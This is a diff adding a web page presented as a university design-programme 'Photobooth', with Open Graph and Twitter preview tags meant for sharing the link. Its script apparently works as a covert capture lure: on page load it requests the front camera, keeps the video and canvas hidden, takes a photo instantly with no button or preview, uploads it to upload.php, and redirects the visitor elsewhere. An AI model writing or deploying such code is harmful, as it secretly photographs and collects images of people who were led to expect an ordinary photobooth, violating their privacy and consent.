@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Photobooth</title>
+
+<!-- Open Graph -->
+<meta property="og:title" content="Photobooth - DKV UPI" />
+<meta property="og:description" content="Ambil foto kerenmu di photobooth DKV UPI dan simpan sebagai kenangan!" />
+<meta property="og:image" content="https://finderdkvupi.id/photobooth/frames/frame1.png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://finderdkvupi.id/photobooth/" />
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Photobooth - DKV UPI" />
+<meta name="twitter:description" content="Ambil foto kerenmu di photobooth DKV UPI dan simpan sebagai kenangan!" />
+<meta name="twitter:image" content="https://finderdkvupi.id/photobooth/frames/frame1.png" />
+
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: black;
+            color: white;
+        }
+
+        #video,
+        #canvas {
+            width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+
+<body class="flex items-center justify-center h-screen">
+    <video id="video" autoplay playsinline class="hidden"></video>
+    <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    video.play();
+                    takePhoto(); // Ambil langsung tanpa delay
+                };
+            } catch (e) {
+                alert("Gagal mengakses kamera");
+                console.error(e);
+            }
+        }
+
+        function takePhoto() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+
+            fetch("upload.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ image: imageData, frame: "frame1.png" })
+            })
+                .then(res => res.json())
+                .then(data => {
+                    console.log("Upload sukses", data);
+                    window.location.href = "photobooth.html";
+                })
+                .catch(err => console.error("Upload gagal", err));
+        }
+
+        startCamera();
+    </script>
+</body>
+
+</html>
